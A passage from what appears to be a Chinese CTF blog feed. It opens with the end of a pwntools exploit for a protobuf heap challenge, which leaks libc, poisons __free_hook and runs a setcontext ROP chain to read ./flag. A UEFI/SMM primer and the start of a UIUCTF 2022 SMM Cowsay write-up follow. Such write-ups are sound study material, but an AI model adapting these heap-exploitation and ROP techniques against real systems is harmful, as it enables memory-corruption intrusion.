class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>版本相关</strong></p><p>最后需要注意的是,有时候会因为<u>版本的差异</u></p><p>导致序列化的细节不相同</p><p>所以这时候就需要对应的版本</p><p>可以参考<a href="https://ywhkkx.github.io/2022/11/03/祥云杯CTF2022/"> Pwn进你的心 (ywhkkx.github.io)</a></p>]]></content>
    
    
    <summary type="html">主要是逆向</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="protobuf" scheme="https://ixout.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>uefi初识</title>
    <link href="https://ixout.github.io/posts/36191/"/>
    <id>https://ixout.github.io/posts/36191/</id>
    <published>2024-04-06T14:37:09.000Z</published>
    <updated>2024-04-18T09:11:31.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>UEFI即Unified Extensible Firmware Interface(<strong>统一可扩展固件接口</strong>)是一种个人电脑系统规格，用来定义操作系统与系统固件之间的软件界面,作为BIOS的替代方案</p><p>更多可见wiki<a href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2">https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2</a></p><h2 id="UEFI组成"><a href="#UEFI组成" class="headerlink" title="UEFI组成"></a>UEFI组成</h2><p>一般认为，UEFI由以下几个部分组成：</p><ol><li>Pre-EFI初始化模块（PEI）</li><li>UEFI驱动程序执行环境（DXE）</li><li>UEFI驱动程序（UEFI driver）</li><li>兼容性支持模块（CSM）</li><li>UEFI高层应用（UEFI Application）</li><li>GUID磁盘分区表</li><li>系统管理模式（SMM）</li></ol><p>Pre-EFI初始化程序在系统开机的时候最先得到执行，它负责最初的CPU，芯片组及主存的初始化工作，<strong>紧接着加载UEFI的驱动程序执行环境（DXE）</strong>。</p><p>当DXE被加载运行时，系统便具有了枚举并加载其他UEFI驱动程序的能力。DXE枚举并加载各种总线（包括PCI、SATA、USB、ISA）及硬件的UEFI驱动程序。例如一个具PCI-E总线接口的RAID存储适配器，其UEFI驱动程序一般会放置在这个设备的Option ROM中。在UEFI规范中，一种突破传统MBR磁盘分区结构限制的GUID磁盘分区系统（GPT）被引入，新结构中，磁盘的主分区数不再受限制（在MBR结构下，只能存在4个主分区），另外UEFI+GPT结合还可以支持2.1 TB以上硬盘。</p><p>在众多的分区类型中，EFI系统分区可以被UEFI固件访问，可用于存放操作系统的引导程序。UEFI固件通过执行EFI系统分区中的启动程序启动操作系统]。</p><p>CSM是在x86平台UEFI系统中的一个特殊的模块，它将为不具备UEFI引导能力的操作系统以及16位的传统Option ROM提供类似于传统BIOS的系统服务。</p><p>在加载操作系统后，UEFI的SMM程序继续执行，提供ACPI等服务</p><h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><blockquote><p>系统管理模式（System Management mode）（以下简称SMM）是Intel在80386SL之后引入x86体系结构的一种CPU的执行模式。系统管理模式只能通过系统管理中断（System Management Interrupt, SMI）进入，并只能通过执行RSM指令退出。SMM模式对操作系统透明，换句话说，操作系统根本不知道系统何时进入SMM模式，也无法感知SMM模式曾经执行过。为了实现SMM，Intel在其CPU上新增了一个引脚SMI# Pin，当这个引脚上为高电平的时候，CPU会进入该模式。在SMM模式下一切被都屏蔽，包括所有的中断。SMM模式下的执行的程序被称作SMM处理程序，所有的SMM处理程序只能在称作系统管理内存（System Management RAM,SMRAM）的空间内运行。可以通过设置SMBASE的寄存器来设置SMRAM的空间。SMM处理程序只能由系统固件（如BIOS或UEFI）实现。</p><p><a href="https://en.wikipedia.org/wiki/System_Management_Mode">System Management Mode</a> is documented in <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a>, Volume 3C, Chapter 30. It is the operating mode with highest privilege, and sometimes referred to as “ring -2”. This mode has higher privilege than an OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered through a System Management Interrupt (SMI), it has a separate address space completely invisible to other operating modes, and full access to all physical memory, MSRs, control registers etc.</p></blockquote><p>SMM有时被称作 <code>ring -2</code>,因为其具有最高级别权限<strong>,唯一进入该模式的方式只有SMI</strong>(系统管理中断)</p><p>处理器执行<em>SMM</em>代码的时候是在一个单独的地址空间（<em>SMRAM</em>）下完成的，并且这段地址空间在其他模式下是绝对不能被访问的</p><p>SMI 可以由软件使用 IO 端口 <code>0xB2</code> 触发(<u>outb dx, al</u>)，并且此功能可用于实现 SMM 和非 SMM 代码之间的某种受控通信机制。并通过<code>RSM</code>指令退出SMM</p><h2 id="UEFI与操作系统的关系"><a href="#UEFI与操作系统的关系" class="headerlink" title="UEFI与操作系统的关系"></a>UEFI与操作系统的关系</h2><p>UEFI在概念上类似于一个低阶的操作系统，并且具有操控所有硬件资源的能力。不少人感觉它的不断发展将有可能代替现代的操作系统。事实上，EFI的缔造者们在第一版规范出台时就将EFI的能力限制于不足以威胁操作系统的统治地位。</p><p>首先，它只是硬件和预启动软件间的接口规范；其次，UEFI环境下<strong>不提供中断的机制</strong>，也就是说每个UEFI驱动程序必须用<strong>轮询</strong>（polling）的方式来检查硬件状态，并且需要以<strong>解释</strong>的方式运行，较操作系统下的机械码驱动效率更低；再则，UEFI系统不提供复杂的缓存器保护功能，它只具备简单的缓存器管理机制，具体来说就是指运行在x64或x86处理器的长模式或保护模式下，以最大寻址能力为限把缓存器分为一个平坦的段（Segment），所有的程序都有权限访问任何一段位置，并不提供真实的保护服务。</p><p>当UEFI所有组件加载完毕时，便会启动操作系统的启动程序，如果UEFI固件内置UEFI Shell，也可以启动UEFI Shell命令提示。<u>UEFI应用程序（UEFI Application）和UEFI驱动程序（UEFI driver）是PE格式的.efi文件，可用C语言编写。</u>在UEFI引导模式下，操作系统的启动程序也是UEFI应用程序，启动程序的EFI文件存储在EFI系统分区（ESP）上。</p><p>UEFI固件区分架构，在UEFI引导模式下，通常只能执行特定架构的UEFI操作系统和特定架构的EFI应用程序（EBC程序除外）。比如，采用64位UEFI固件的PC，在UEFI引导模式下只能执行64位操作系统启动程序；而在Legacy引导模式（即BIOS兼容引导模式）下，既可以执行16位的操作系统（如DOS），也可以执行32位操作系统和64位操作系统。</p><h2 id="EDK2"><a href="#EDK2" class="headerlink" title="EDK2"></a>EDK2</h2><p><a href="https://github.com/tianocore/edk2/tree/master">tianocore/edk2: EDK II</a></p><p>EDK2（EFI Development Kit II）是一个开源的项目，它提供了一个用于开发 UEFI（统一扩展固件接口）固件的全面工具和框架。</p><p>也是事实上的UEFI的实现</p><p>我们做的题目都是是基于EDK2,大多数时候给的是OVMF.fd</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="uictf2022-cowsay1"><a href="#uictf2022-cowsay1" class="headerlink" title="uictf2022-cowsay1"></a>uictf2022-cowsay1</h2><p>参考<a href="https://ctftime.org/writeup/34881">CTFtime.org / UIUCTF 2022 / SMM Cowsay 1 / Writeup</a></p><p><strong>learn interface</strong></p><h3 id="摸索"><a href="#摸索" class="headerlink" title="摸索"></a>摸索</h3><p>我们收到的文件包含：</p><ul><li>构建的挑战二进制文件以及 <code>qemu-system-x86_64</code> 二进制文件和启动脚本提供了在本地运行挑战所需的参数。</li><li>挑战赛的源代码是 EDK2（事实上的标准 UEFI 实现）和 QEMU 的一系列补丁，以及用于应用它们并构建所有内容的 <code>Dockerfile</code> 。</li><li>为远程运行的挑战而完成的构建的 EDK2 构建工件（即带有有用调试符号的二进制文件）。</li></ul><p>运行挑战时，我们会收到以下消息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Shell&gt; binexec</span><br><span class="line"> ____________________________________________________________________</span><br><span class="line">/ Welcome to binexec!                                                \</span><br><span class="line">| Type some shellcode <span class="keyword">in</span> hex and I<span class="string">&#x27;ll run it!                        |</span></span><br><span class="line"><span class="string">|                                                                    |</span></span><br><span class="line"><span class="string">| Type the word &#x27;</span><span class="keyword">done</span><span class="string">&#x27; on a seperate line and press enter to execute |</span></span><br><span class="line"><span class="string">\ Type &#x27;</span><span class="built_in">exit</span><span class="string">&#x27; on a seperate line and press enter to quit the program /</span></span><br><span class="line"><span class="string"> --------------------------------------------------------------------</span></span><br><span class="line"><span class="string">                    \   ^__^</span></span><br><span class="line"><span class="string">                     \  (oo)\_______</span></span><br><span class="line"><span class="string">                        (__)\       )\/\</span></span><br><span class="line"><span class="string">                            ||----w |</span></span><br><span class="line"><span class="string">                            ||     ||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Address of SystemTable: 0x00000000069EE018</span></span><br><span class="line"><span class="string">Address where I&#x27;</span>m gonna run your code: 0x000000000517D100</span><br></pre></td></tr></table></figure><p>其启动了一个<a href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,事实上大多数uefi的题目使用的都是该开源软件,然后在其上进行一些patch</p><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>EDK2 补丁 <code>0003-SmmCowsay-Vulnerable-Cowsay.patch</code> 实现了一个名为 <code>SmmCowsay.efi</code> 的 UEFI SMM 驱动程序：该驱动程序将在 SMM 中运行，并注册一个要执行的处理程序（通过 <code>SmiHandlerRegister</code> 函数）在 SMM 中，打印文本的方式与owsay Linux 命令非常相似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure><p><strong>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</strong></p><p>下一个补丁 <code>0004-Add-UEFI-Binexec.patch</code> 实现了一个名为 <code>Binexec.efi</code> 的普通UEFI驱动程序，它将与我们交互（通过控制台输入/输出）并与 <code>SmmCowsay.efi</code> 驱动程序交互以打印我们在运行挑战时看到上面的问候横幅。</p><p>为了与 <code>SmmCowsay.efi</code> 驱动程序进行通信， <code>Binexec.efi</code> 通过 <code>EFI_SMM_COMMUNICATION_PROTOCOL</code> 结构体提供的 <code>-&gt;Communicate()</code> 方法发送一条“消息”：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;Communicate(</span><br><span class="line">    mSmmCommunication, <span class="comment">// &quot;THIS&quot; pointer</span></span><br><span class="line">    Buffer,            <span class="comment">// Pointer to message of type EFI_SMM_COMMUNICATE_HEADER</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>该函数将消息复制到全局变量中并触发软件 SMI 来处理它。该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</p><p><code>Binexec.efi</code> 驱动程序将简单地在循环中运行，要求我们提供一些十六进制形式的代码，将其复制到 RWX 内存区域，然后跳转到其中（使用程序集包装器保存/恢复寄存器）。这意味着我们能够在 UEFI 驱动程序内运行任意代码，该驱动程序以超级用户模式（也称为 Ring 0）运行。</p><p>QEMU 补丁实现了一个自定义 MMIO 设备，该设备只需读取主机上的 <code>region4</code> 文件，并创建一个从物理地址 <code>0x44440000</code> 开始、大小为 <code>0x1000</code> 的 MMIO 内存区域。保存该文件的内容。这意味着访问地址 <code>0x44440000</code> 处的物理内存将调用 QEMU 设备读/写操作 ( <code>MemoryRegionOps</code> )，这将决定如何处理内存读/写。</p><p>读取操作处理程序 ( <code>uiuctfmmio_region4_read_with_attrs()</code> ) 执行检查，确保读取在传递给函数的 <code>MemTxAttrs</code> 结构中设置了 <code>.secure</code> 标志，这意味着读取由SMM发出。如果不是这种情况，则会返回一个假标志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">uiuctfmmio_region4_read_with_attrs</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> *val, <span class="type">unsigned</span> size, MemTxAttrs attrs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!attrs.secure)</span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span><br><span class="line">    <span class="keyword">return</span> MEMTX_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EFI-System-Table"><a href="#EFI-System-Table" class="headerlink" title="EFI System Table"></a>EFI System Table</h3><p>打印给我们的信息,还让我们获得了 <code>SystemTable</code> 的地址以及 shellcode 将复制（和运行）的地址。在 UEFI 规范上花费的时间可能超出了所需的时间，它包含了我们了解其含义所需的所有信息。</p><p><code>SystemTable</code> 是 EFI 系统表，它是一个包含在 UEFI 驱动程序中执行任何操作所需的所有信息的结构。它保存了一堆指向其他结构的指针，这些结构实际上保存了另一堆指向 API 方法、配置变量等的指针。</p><blockquote><p>UEFI uses the EFI System Table, which contains pointers to the runtime and boot services tables. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the service tables are pointers to functions as defined in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> and <a href="https://uefi.org/specs/UEFI/2.10/08_Services_Runtime_Services.html#services-runtime-services">Services — Runtime Services</a> . Prior to a call to <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a> , all of the fields of the EFI System Table are valid. After an operating system has taken control of the platform with a call to <em>ExitBootServices()</em> , only the <em>Hdr</em> , <em>FirmwareVendor</em> , <em>FirmwareRevision</em> , <em>RuntimeServices</em> , <em>NumberOfTableEntries</em> , and <em>ConfigurationTable</em> fields are valid.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER                 Hdr;</span><br><span class="line">  CHAR16                           *FirmwareVendor;</span><br><span class="line">  UINT32                           FirmwareRevision;</span><br><span class="line">  EFI_HANDLE                       ConsoleInHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL   *ConIn;</span><br><span class="line">  EFI_HANDLE                       ConsoleOutHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *ConOut;</span><br><span class="line">  EFI_HANDLE                       StandardErrorHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *StdErr;</span><br><span class="line">  EFI_RUNTIME_SERVICES             *RuntimeServices;</span><br><span class="line">  EFI_BOOT_SERVICES                *BootServices;</span><br><span class="line">  UINTN                            NumberOfTableEntries;</span><br><span class="line">  EFI_CONFIGURATION_TABLE          *ConfigurationTable;</span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure><p>我们现在感兴趣的是 EFI 系统表的 <code>BootServices</code> 字段，它保存指向 EFI 引导服务表的指针（参阅<a href="https://uefi.org/specs/UEFI/2.10/04_EFI_System_Table.html#efi-boot-services-table">EFI System Table — UEFI Specification documentation</a>）：另一个表保存一堆针对不同 UEFI API 的有用函数指针。</p><blockquote><p>UEFI uses the EFI Boot Services Table, which contains a table header and pointers to all of the boot services. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the EFI Boot Services Tables are prototypes of function pointers to functions as defined in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> . The function pointers in this table are not valid after the operating system has taken control of the platform with a call to <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_SIGNATURE 0x56524553544f4f42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_REVISION EFI_SPECIFICATION_VERSION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER     Hdr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Task Priority Services</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  EFI_RAISE_TPL        RaiseTPL;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">  EFI_RESTORE_TPL      RestoreTPL;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Memory Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_ALLOCATE_PAGES   AllocatePages;  <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_PAGES       FreePages;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_GET_MEMORY_MAP   GetMemoryMap;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_ALLOCATE_POOL    AllocatePool;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_POOL        FreePool;       <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Event &amp; Timer Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CREATE_EVENT     CreateEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_TIMER        SetTimer;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_WAIT_FOR_EVENT   WaitForEvent;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SIGNAL_EVENT     SignalEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CLOSE_EVENT      CloseEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CHECK_EVENT      CheckEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Protocol Handler Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_INSTALL_PROTOCOL_INTERFACE     InstallProtocolInterface;            <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REINSTALL_PROTOCOL_INTERFACE   ReinstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_UNINSTALL_PROTOCOL_INTERFACE   UninstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_HANDLE_PROTOCOL                HandleProtocol;                      <span class="comment">// EFI 1.0+</span></span><br><span class="line"> VOID*   Reserved;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REGISTER_PROTOCOL_NOTIFY       RegisterProtocolNotify;              <span class="comment">// EFI  1.0+</span></span><br><span class="line">    EFI_LOCATE_HANDLE                  LocateHandle;                        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_LOCATE_DEVICE_PATH             LocateDevicePath;                    <span class="comment">// EFI 1.0+</span></span><br><span class="line"> EFI_INSTALL_CONFIGURATION_TABLE       InstallConfigurationTable;           <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Image Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               LoadImage;        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_START                StartImage;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT                       Exit;          